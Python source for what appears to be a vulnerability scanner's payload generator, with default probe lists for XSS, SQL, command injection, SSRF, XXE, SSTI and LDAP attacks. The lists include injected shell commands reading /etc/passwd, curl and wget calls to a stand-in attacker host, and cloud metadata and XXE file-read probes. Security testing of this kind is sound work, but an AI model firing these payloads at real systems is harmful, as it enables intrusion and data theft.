from typing import List, Dict
import json
import os
from pathlib import Path

class PayloadGenerator:
    def __init__(self):
        self.data_dir = Path(__file__).parent.parent / 'data'
        self.payload_cache = {}
        self._load_payloads()
    
    def _load_payloads(self):
        payload_files = {
            'XSS': 'xss_payloads.json',
            'SQL': 'sql_payloads.json',
            'RCE': 'rce_payloads.json',
            'CommandInjection': 'command_injection_payloads.json',
            'SSRF': 'ssrf_payloads.json',
            'XXE': 'xxe_payloads.json',
            'FileUpload': 'file_upload_payloads.json',
            'API': 'api_payloads.json',
            'SSTI': 'ssti_payloads.json',
            'LDAP': 'ldap_payloads.json'
        }
        
        for vuln_type, filename in payload_files.items():
            filepath = self.data_dir / filename
            if filepath.exists():
                with open(filepath, 'r', encoding='utf-8') as f:
                    self.payload_cache[vuln_type] = json.load(f)
            else:
                self.payload_cache[vuln_type] = self._get_default_payloads(vuln_type)
    
    def generate_payloads(self, scan_type: str) -> List[str]:
        payloads = self.payload_cache.get(scan_type, [])
        
        if isinstance(payloads, dict):
            return payloads.get('payloads', [])
        
        return payloads if isinstance(payloads, list) else []
    
    def _get_default_payloads(self, vuln_type: str) -> List[str]:
        defaults = {
            'XSS': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=javascript:alert('XSS')>",
                "<body onload=alert('XSS')>",
                "<input autofocus onfocus=alert('XSS')>",
                "<select autofocus onfocus=alert('XSS')>",
                "<textarea autofocus onfocus=alert('XSS')>",
                "<marquee onstart=alert('XSS')>"
            ],
            'SQL': [
                "' OR '1'='1",
                "' OR 1=1--",
                "' OR '1'='1'--",
                "admin' --",
                "admin' #",
                "' UNION SELECT NULL--",
                "' UNION SELECT NULL,NULL--",
                "1' AND '1'='1",
                "1' AND 1=1--",
                "' OR 'a'='a"
            ],
            'RCE': [
                "; ls -la",
                "| ls -la",
                "& ls -la",
                "`ls -la`",
                "$(ls -la)",
                "; cat /etc/passwd",
                "| cat /etc/passwd",
                "; whoami",
                "| whoami",
                "; id"
            ],
            'CommandInjection': [
                "; sleep 5",
                "| sleep 5",
                "& sleep 5",
                "`sleep 5`",
                "$(sleep 5)",
                "; ping -c 5 127.0.0.1",
                "| ping -c 5 127.0.0.1",
                "; curl http://attacker.com",
                "| curl http://attacker.com",
                "; wget http://attacker.com"
            ],
            'SSRF': [
                "http://localhost",
                "http://127.0.0.1",
                "http://169.254.169.254",
                "http://0.0.0.0",
                "http://[::1]",
                "http://localhost:8080",
                "http://127.0.0.1:22",
                "http://192.168.1.1",
                "file:///etc/passwd",
                "dict://localhost:11211"
            ],
            'XXE': [
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
                '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
            ],
            'SSTI': [
                "{{7*7}}",
                "${7*7}",
                "<%= 7*7 %>",
                "{{7*'7'}}",
                "#set($x=7*7)$x"
            ],
            'LDAP': [
                "*",
                "*)(|(mail=*",
                "admin)(|(password=*",
                "*)(uid=*",
                "admin*)(|(uid=*"
            ]
        }
        
        return defaults.get(vuln_type, [])